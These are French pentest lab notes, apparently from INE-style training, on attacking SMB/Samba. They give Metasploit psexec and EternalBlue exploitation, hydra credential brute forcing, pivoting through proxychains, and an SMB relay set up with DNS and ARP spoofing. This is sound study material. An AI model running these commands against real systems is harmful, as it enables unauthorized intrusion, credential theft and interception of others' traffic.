
# SMB/SAMBA

---

## PSEXEC avec Metasploit

* Scan classique avec `-script=smb-protocols` permet de voir les différents protocoles supportés par le serveur.  
* Lancer Metasploit  
* ``auxiliary/scanner/smb/smb_login`` et renseigner les options, pour brute forcer les users/passwords.  
* Une fois user/password récupérés, nous pouvons exécuter `exploit/windows/smb/psexec` et renseigner les bonnes infos (cible, user, password.) puis on lance l'exploit  
* On obtient ensuite un meterpreter. ( `shell`...)  
* On peut lancer aussi avec `psexec.py`  
  

## SMBCLIENT 
Se connecter à un SMB client qui autorise la connection anonyme sans mot de passe.    
* `smbclient //IP_TARGET/MY_SHARE`
`-N` si pas de mot de passe  
* `smbclient //SERVEUR/PARTAGE -U utilisateur` il nous demandera le mot de passe.  
* `smbclient //SERVEUR/PARTAGE -U utilisateur%motdepasse`
* `smbclient -L //SERVEUR -U utilisateur` Pour lister les partages grâce `-L`.  



## Exploitation de la vulnérabilité SMB Windows MS17-010 (EternalBlue)
* On peut notamment exploiter le protocole SMBv1:  
Ex : `nmap -sV -p 445 --script=smb-vuln-ms17-010 -O 10.10.10.12` permet de scanner l'IP indiquée sur le port 445 avec la version du service et l'OS et de savoir si la cible est vulnérable à EternalBlue.  

* `exploit/windows/smb/ms17_010_eternalblue` : Renseigner les paramètres (LOHST, LPORT, RHOSTS). Puis `run`  
Si l'exploit fonctionne, nous obtenons un meterpreter.  



# SAMBA
**Brute force de credentials :**
* `hydra -L Wordlist_users.txt -P Wordlist_passwords.txt smb://demo.ine.local -t 4`  
  OU avec Metasploit :  
* Le module `auxiliary/scanner/smb/smb_login` permet de bruteforcer les credentials  

## smbmap
Permet de lister les partages
`smbmap -H demo.ine.local -u admin -p password1`



# SMB & NETBIOS

`nbtscan` : Netbios enumération.  

* `nmap -p445 --script smb-protocols IP_Target`: Pour connaître toutes les versions SMB prises en charge sur la machine cible  
* `nmap -p445 --script smb-security-mode IP-Target` Permet ensuite de déterminer le niveau de sécurité de ce protocole  
![alt text](<Images/Capture d'écran 2026-01-18 182123.png>)
 * `smbclient -L IP_Target` : Permet de se connecter en anonymous si il est autorisé, sans mot de passe et de lister les partages disponibles.  
 * `nmap -p445 --script smb-enum-users Target_IP` : Lister les users.  
 Une fois les users trouvés, les rentrer dans un fichier texte, puis brute forcer avec hydra.  
 * `exploit/windows/smb/psexec` : Permet de récupérer un shell.  
 * Puis `run autoroute -s network/CIDR` : Permet d’accéder à un réseau interne via la machine compromise. `-s` précise le réseau à ajouter. `autoroute` ajoute une route réseau dans Metasploit.  
👉 C’est du pivoting  
* `background` permet de mettre la session en arrière plan et de revenir sur les modules de metasploit.  
* `cat /etc/proxychains4.conf` Démarrer le serveur proxy socks pour accéder au système pivot sur la machine de l’attaquant à l’aide de l’outil proxychains. On constate que le port proxychain est 9050.  
* Dans metasploit, `auxiliary/server/socks_proxy` : Utiliser ce module en réglant la version sur 4a et le SRVPORT sur 9050.  
Maintenant, démarrons le serveur proxy socks pour accéder au système pivot sur la machine de l’attaquant à l’aide de l’outil proxychains.  
* `proxychains nmap demo1.ine.local -sT -Pn -sV -p 445` :  
  ``demo1.ine.local``: La machine à pivot

``-sT``: Analyse de connexion TCP

``-Pn`` Ignorer la découverte de l'hôte et forcer l'analyse des ports.

``-sV``: Analyser les ports ouverts pour déterminer les informations de service/version

``-p 445``: Définir le port à scanner

Cette analyse est la méthode la plus sûre pour identifier les ports ouverts. Nous pourrions utiliser un module d'analyse de ports TCP auxiliaire, mais ces modules sont très intrusifs et peuvent interrompre votre session.  

* On migre vers explorer.exe pour avoir le sprivilèges : `migrate -N explorer.exe`  
* On retourne sur le meterpreter : `sessions -i 1`, `shell`, `net view IP_Target`, on voit les ressources partagées.  
* On peut donc mapper les lecteurs :  
   - net use D: \\10.0.28.125\Documents  
   - net use K: \\10.0.28.125\K$  

* Il ne reste plus qu'à se promener et regarder les flags.  



# SMB Relay

Dans Metasploit, `search smb_relay` ou `use exploit/windows/smb/smb_relay`  
SRVHOST et LHOST sont l'IP de l'attaquant (renseigner aussi la cible)  

``echo "172.16.5.101 *.sportsfoo.com" > dns`` : crée un fichier "dns" qui contient l'IP de l'attaquant et le domaine cible.  

``dnsspoof -i eth1 -f dns`` : lance une attaque de spoofing DNS sur l’interface réseau eth1. ("-f dns" utilise le fichier dns qui contient les fausses correspondances nom de domaine -> IP)  
``echo 1 > /proc/sys/net/ipv4/ip_forward`` : Active le routage  
A savoir, ici la gateway est 172.16.5.1  

`arpspoof -i eth1 -t 172.16.5.5 172.16.5.1`  
`arpspoof -i eth1 -t 172.16.5.1 172.16.5.5`  
Ces deux commandes font une attaque ARP spoofing (ARP poisoning) pour se placer au milieu des communications. Tu dis à la victime (172.16.5.5) que la passerelle (172.16.5.1), c’est toi. Et tu dis à la passerelle que la victime, c’est toi.  
On devient Man-In-The-Middle.  


